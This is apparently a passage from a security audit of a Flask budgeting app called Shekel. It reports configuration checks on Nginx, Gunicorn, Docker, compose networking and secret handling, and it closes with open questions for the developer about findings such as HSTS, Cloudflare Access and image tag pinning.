**Check 3 -- `DATABASE_URL` handling.** `ProdConfig` (`config.py:96`)
uses `os.getenv("DATABASE_URL")` with no default and
`ProdConfig.__init__` (`config.py:136-137`) raises if it is unset. Dev
and Test configs have local peer-auth fallbacks which is acceptable for
localhost. Grep of `app/` and `scripts/` shows the only places that
interpolate `DATABASE_URL` into strings are `scripts/verify_backup.sh`
and `scripts/repair_orphaned_transfers.py`, both of which pass it via
environment, not via log/print output.

**Check 6 -- `SESSION_COOKIE_HTTPONLY`.** `config.py:127` sets it to
`True` in ProdConfig. Flask's default is also `True`, so no risk of
accidental downgrade.

**Check 10 -- `WTF_CSRF_TIME_LIMIT`.** Not overridden in `config.py`, so
Flask-WTF's default of 3600 seconds applies -- a reasonable balance.
Test config disables CSRF at `config.py:73` -- scoped correctly.

**Check 14 -- `Permissions-Policy`.** Present at
`app/__init__.py:417-419` with `camera=(), microphone=(), geolocation=()`.
Not comprehensive (modern policies also disable `interest-cohort`,
`payment`, `usb`, `serial`, etc.) but good enough for a budget app that
does not need any of those.

**Checks 19-20 -- TLS config / server_tokens.** `nginx.conf` has no TLS
configuration at all -- `listen 80;` only. This is intentional per the
architecture comment at `nginx.conf:9-11`: Cloudflare terminates TLS at
the edge and cloudflared tunnels HTTP to Nginx over the loopback
interface. There is no `ssl_protocols`, `ssl_ciphers`, or `ssl_*`
directive to audit. `server_tokens` is also not explicitly set --
Nginx's default is `on`, meaning the `Server` header exposes the Nginx
version. Low but worth adding `server_tokens off;` in a future hardening
pass.

**Check 21 -- `proxy_pass` SSRF surface.** The only `proxy_pass` in
`nginx.conf:169` targets `http://gunicorn` via the explicit upstream
block at lines 135-137 (`server app:8000;`). Static target, no dynamic
interpolation of request data -- no SSRF.

**Check 22 -- dotfile exposure.** No `location` block in
`nginx.conf` serves `/.env`, `/.git`, or any dotfile. The only
`location` blocks are `/static/` and `/`. Clean.

**Check 23 -- Nginx header overrides.** Nginx sets only two headers
(`Cache-Control` and `X-Content-Type-Options`) and both are scoped to
the `/static/` location. The `/` location does not add any headers, so
Flask's `after_request` headers pass through unmodified. No CSP
collision.

**Check 28 -- `originRequest` body limits in cloudflared.** None set,
but there are also no file-upload endpoints in Shekel (confirmed by
the workflow doc's "Not in Scope" list). Nginx's `client_max_body_size
5m` at `nginx.conf:104` already caps request bodies.

**Check 30 -- Gunicorn `worker_class`.** Not set, so Gunicorn defaults
to `sync` workers. Correct for a synchronous Flask app with database I/O
per request.

**Check 32 -- Gunicorn `preload_app`.** Not set (default: False). Not a
security concern; a performance choice.

**Check 33 -- Gunicorn access/error log destinations.** `accesslog =
None` at `gunicorn.conf.py:48` (app's Flask middleware already logs
requests -- no duplication). `errorlog = "-"` at line 53 sends to
stderr/stdout, captured by Docker logs. Good for container-friendly
telemetry, no file-on-disk to fill.

**Check 34 -- Access log content.** `app/utils/logging_config.py:133-180`
builds the `_log_request_summary` after-hook and records: method, path,
status, request_duration, remote_addr, user_id. It does NOT log request
bodies, headers, cookies, or query strings. Clean.

**Check 35 -- Non-root Docker user.** `Dockerfile:31` creates the
`shekel` user and `Dockerfile:47` sets `USER shekel` before `ENTRYPOINT`.
Container runs as non-root. Confirmed.

**Check 36 -- Dockerfile HEALTHCHECK.** Present at `Dockerfile:55-56`.

**Check 37 -- `COPY --chown`.** `Dockerfile:39-40` uses
`--chown=shekel:shekel` for both the application code and the
entrypoint. Correct ownership.

**Check 38 -- bind mounts.** Prod compose mounts only `nginx.conf` (read-only)
at `docker-compose.yml:104` and the `static_files` named volume. No
writable host bind mount into the app container. Dev compose mounts
the source tree at `docker-compose.dev.yml:108` -- expected for live
reload, not a prod concern.

**Check 39 -- exposed ports.** `docker-compose.yml:98-101` exposes only
`NGINX_PORT:80` for the Nginx service. `db` and `app` have no `ports:`
entries -- they live on the internal `backend` network only. Correct.

**Check 40 -- Network segmentation.** `docker-compose.yml:129-136`
declares `frontend` (default bridge) and `backend` (`internal: true`).
Nginx is on both, `app` and `db` are on `backend` only. Correct --
the database is unreachable from the host and from the internet.

**Check 41 -- Inline secrets in compose.** Every secret in
`docker-compose.yml` is interpolated from `.env` via
`${VAR:?Set VAR in .env}` or `${VAR:-default}`. No plaintext
`FOO: bar_password` entries. The dev compose file at
`docker-compose.dev.yml:91-95` hardcodes dev-only passwords
(`shekel_pass`, `ChangeMe!2026`) which is acceptable for localhost
development, though see F-C-14 for the broader SECRET_KEY placeholder
issue.

**Check 42 (partial) -- `:latest` tags.** `postgres:16-alpine` and
`nginx:1.27-alpine` are minor-version pinned; acceptable. The app
image uses `:latest` -- reported as F-C-10.

**Check 43 -- Docker socket mount.** `docker-compose.yml` and
`docker-compose.dev.yml` have zero `/var/run/docker.sock` references.
Clean.

**Check 44 -- `.env` in `.gitignore`.** Line 18:
```
# Environment / secrets
.env
```
Confirmed with `git check-ignore .env` returning `.env`. `git ls-files`
confirms `.env` is not tracked.

**Check 46 -- Python/pytest/coverage exclusions.** `.gitignore:4-10`
excludes `__pycache__/`, `*.py[cod]`, `*.egg-info/`, `dist/`, `build/`.
Lines 35-38 exclude `.pytest_cache/`, `htmlcov/`, `.coverage`,
`coverage.xml`. `.audit-venv/` is listed at line 51. Clean.

**Check 47 -- Secrets elsewhere.** Grep for `SECRET_KEY`,
`TOTP_ENCRYPTION_KEY`, `DATABASE_URL`, and monetary/password-ish
literals across `app/` and `scripts/` finds no secret values baked
into non-config files. `scripts/seed_user.py:142` correctly prints
`Password: [set via SEED_USER_PASSWORD env var or default]` -- this
was a prior finding that has been fixed.

## Open questions for the developer

1. **F-C-02 / HSTS:** Is Cloudflare's dashboard configured to inject
   `Strict-Transport-Security` at the edge for the tunnel hostname?
   If yes, document it in `docs/runbook.md` and downgrade this
   finding to Info. If no, add it in Flask per the recommendation.
2. **F-C-11 / Cloudflare Access:** Is there an Access policy
   attached to the tunnel hostname (email auth, device posture,
   etc.)? The repo artifact does not show one -- verify the dashboard
   state and document the outcome.
3. **F-C-01 / Nginx trust envelope:** What is the actual CIDR of the
   `shekel-prod_backend` Docker bridge? Section 1D will need this to
   lock down both `set_real_ip_from` and `forwarded_allow_ips`
   precisely.
4. **F-C-09 / rate limiter backend:** Is there existing appetite for
   running a Redis sidecar, or would single-worker production be
   preferred for simplicity?
5. **F-C-07 / session lifetime:** What is the desired maximum session
   idle time? 7 days, 1 day, 12 hours? Pick a value and the
   recommendation in F-C-07 becomes concrete.
6. **F-C-10 / image pinning:** Is there already a release-tag scheme
   in the deploy pipeline, or does every push to main overwrite
   `:latest`?
